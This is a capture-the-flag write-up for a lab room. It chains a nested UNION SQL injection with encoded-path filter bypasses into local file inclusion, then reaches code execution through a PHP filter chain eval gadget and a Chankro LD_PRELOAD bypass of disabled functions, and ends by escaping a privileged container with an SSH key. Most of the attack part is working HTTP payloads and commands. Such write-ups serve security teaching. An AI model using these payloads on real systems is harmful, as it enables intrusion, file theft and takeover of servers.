---
title: Moebius room official writeup
draft: false
tags:
  - sqli
  - LFI
  - php
date: 2025-04-28
---
# From SQLi to LFI

In this room I want to give the opportunity to play with a very cool technique to transform a LFI to RCE.
We will have some limitations though, given by disabled functions.

Before starting be sure to have a look to cute cats, and of course do not miss the Schrödinger one or the fun QR code!

Our starting point is `album.php` which is vulnerable to SQLi. 
The SQLi is (almost) trivial to exploit but we do not find anything useful in the db.

We can investigate the db structure: here I'm showing output from `sqlmap` used with option `--sql-shell`. Somehow my version of sqlmap is not
able to show columns `id` and `album_id` if run as usual. An automatic alternative would be running it with the following option option: `--technique=E`.

```
select group_concat(table_name) FROM information_schema.tables WHERE table_schema ='web': 'images,albums'
select group_concat(column_name) FROM information_schema.columns WHERE table_name = 'albums' and table_schema='web': 'id,short_tag,name'
select group_concat(column_name) FROM information_schema.columns WHERE table_name = 'images' and table_schema='web': 'id,album_id,path'
```


So we have 2 tables

```
Database: web
Table: albums
[3 entries]
+----+----------------+-----------+--------------------------+
| id | name           | short_tag | description              |
+----+----------------+-----------+--------------------------+
| 1  | Cute cats      | cute      | Cutest cats in the world |
| 2  | Smart cats     | smart     | So smart...              |
| 3  | Favourite cats | fav       | My favourite ones        |
+----+----------------+-----------+--------------------------+

Database: web
Table: images
[16 entries]
+----+----------+----------------------------+
| id | album_id | path                       |
+----+----------+----------------------------+
| 1  | 1        | /var/www/images/cat1.jpg   |
| 2  | 1        | /var/www/images/cat2.jpg   |
| 3  | 1        | /var/www/images/cat3.jpg   |
| 4  | 1        | /var/www/images/cat4.jpg   |
|    | ...      | ...                        |
+--------------------------------------------+

```

We can now think how album.php is working with queries: starting from `short_tag`, the `album_id` is extracted and that is used to build a query to the images table to get a page with all pictures associated with that album. Key point here is that the application is not doing a join, but two distinct queries

```php
$album_id = "SELECT id from albums where short_tag = '" . $_GET['short_tag'] . "'";
// Fetch image IDs from the database
$sql_ids = "SELECT * FROM images where album_id=" . $id;
```

We can prove this theory with queries like:

```
GET /album.php?short_tag='+union+select+'1'--+- HTTP/1.1 # this gives usual results
GET /album.php?short_tag='+union+select+'a'--+- HTTP/1.1 # Connection failed: SQLSTATE[42S22]: Column not found: 1054 Unknown column 'a' in 'where clause'
```

We can now build a nested SQL query inside the union select:

```
GET /album.php?short_tag='+union+select+'0+union+select+111,222,333'--+- HTTP/1.1
## this gives us

/image.php?hash=f958f05da691284b5990928143ccf5dcdb7e6e24574a2a6db6807d41d1e4f661&path=333
```

We are getting close to building arbitrary paths: can we get `/etc/passwd`? Yes but we have to overcome some stupid filters that prevent the `/` character in particular. 


```
GET /album.php?short_tag='+union+select+'0+union+select+111,222,"/etc/passwd"'--+- HTTP/1.1 
# Hacking attempt detected

GET /album.php?short_tag='+union+select+'0+union+select+111,222,0x2f6574632f706173737764'--+- HTTP/1.1
# /image.php?hash=9fa6eacac1714e10527da6f9cf8570e46a5747d9ace37f4f9e963f990429310d&path=/etc/passwd

GET /album.php?short_tag='+union+select+'0+union+select+111,222,FROM_BASE64("L2V0Yy9wYXNzd2Q=")'--+- HTTP/1.1
# /image.php?hash=9fa6eacac1714e10527da6f9cf8570e46a5747d9ace37f4f9e963f990429310d&path=/etc/passwd

GET /album.php?short_tag='+union+select+'0+union+select+111,222,FROM_BASE64("cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1pbmRleC5waHA=")'--+- HTTP/1.1
# /image.php?hash=f27db9e3961fc359b4d52b596c30717bfbf19b16584a3c64d0c15f498aad16fc&path=php://filter/convert.base64-encode/resource=index.php
```

At this point we can also use php filters to read the source code, but it does not give much more for the following.

One point that is worth noting is the fact that `image.php`  is **including** files:

```html
<b>Warning</b>:  include(doesnotexists): Failed to open stream: No such file or directory in <b>/var/www/html/image.php</b> on line <b>35</b><br />
```

# From LFI to RCE

We should now think of a way to transoform LFI into RCE, but we are quite limited since we don't have file upload functionalities, and we can see that http includes are forbidden.

We could use temporary files (maybe exploiting the fact that we can have SLEEP with the SQLi while doing a file upload that goes to `/tmp/php****`), but for this we need a way to list
directories otherwise it's not going to be very efficient and we don't have a vulnerable endpoint that gives us this information.

In 2022 a very cool method to transform an LFI into RCE using php filters was widely discussed: see for instance https://github.com/synacktiv/php_filter_chain_generator.

One of the shortest possible chain that I like to use is obtained with this command 

```bash
python3 php_filter_chain_generator.py --chain '<?=`$_GET[0]`;?>'
```

Unfortunately, in our case shell_exec and many other functions are disabled (as we will see later) and this does not work.
So we try to switch to eval, and we build a chain like this:

```bash
python3 php_filter_chain_generator.py --chain '<?php eval($_POST[0]);?>'
```

We use the chain in this way:

```
GET /album.php?short_tag='+union+select+'0+union+select+111,222,FROM_BASE64("<php_filter_chain_converted_to_base64>")'--+- HTTP/1.1
```

This payload can be used in a request like this one

```
POST /image.php?hash=3d375cfe64324cf8a25b9de29274f646a13fcfafce4361aec1fd82ecbb02f40a&path=<php_filter_chain> HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 16

0=phpinfo();
```

Here we can confirm that php is quite hardened:

```
disable_functions = disk_total_space, diskfreespace, exec, system, popen, proc_open, proc_nice, shell_exec, passthru, dl, pcntl_alarm, pcntl_async_signals, pcntl_errno, pcntl_exec, pcntl_fork, pcntl_get_last_error, pcntl_getpriority, pcntl_rfork, pcntl_setpriority, pcntl_signal_dispatch, pcntl_signal_get_handler, pcntl_signal, pcntl_sigprocmask, pcntl_sigtimedwait, pcntl_sigwaitinfo, pcntl_strerror, pcntl_unshare, pcntl_wait, pcntl_waitpid, pcntl_wexitstatus, pcntl_wifexited, pcntl_wifsignaled, pcntl_wifstopped, pcntl_wstopsig, pcntl_wtermsig
```

At least at this point we are **free from the SQLi** and we can use just the `image.php` endpoint, **playing with php code in the POST variable** (with much more freedom regarding payload length).

We can use the technique described here to bypass disabled functions: https://github.com/TarlogicSecurity/Chankro.
There is also a nice THM room on the subject: https://tryhackme.com/r/room/bypassdisablefunctions.

Since the chankro payload is going to be pretty large, that's the reason why we are using `$_POST` in our PHP LFI gadget.
The chankro repository generates a payload that looks like this:

```php
<?php
$hook = '<.so library base64 encoded>';
$meterpreter = "<base64 shell you want to execute>"; 
file_put_contents('/tmp/chankro.so', base64_decode($hook));
file_put_contents('/tmp/acpid.socket', base64_decode($meterpreter));
putenv('CHANKRO=/tmp/acpid.socket');
putenv('LD_PRELOAD=/tmp/chankro.so');
mail('a','a','a','a');?>
```

So after generating the chankro php payload we have to do two things:

- upload it to the server using eval RCE
- include it in order to fire our shell

So we go back to our LFI and we do the upload

```
POST /image.php?hash=3d375cfe64324cf8a25b9de29274f646a13fcfafce4361aec1fd82ecbb02f40a&path=<php_filter_chain>

0=file_put_contents('/tmp/chankro.php',base64_decode("<chankro payload base64 encoded>"));
```

and then we fire our shell: we just have to generate the file inclusion for `/tmp/chankro.php`:

```
GET /album.php?short_tag='+union+select+'0+union+select+111,222,FROM_BASE64("L3RtcC9jaGFua3JvLnBocA==")'--+- HTTP/1.1

# /image.php?hash=1cb97ded45aa4da693030e3081fbd1486c923b6bf458d94b85ce10198f960bf0&path=/tmp/chankro.php
```

At this point we should have a shell as www-data on the machine. It's trivial to become root and, since we are in a privileged container, we can simply `mount /dev/whatever /mnt`, put our ssh key in root's authorized_keys file, and connect as root to the host.

At this point... we have the user.txt flag!

For root flag we have to go back at where we started: there is something hidden in a database inside the db container. Finding credentials to access the db is left as an exercise to the reader.

By the way we did sqli -> lfi -> rce then back to db. This explains the room name "joke"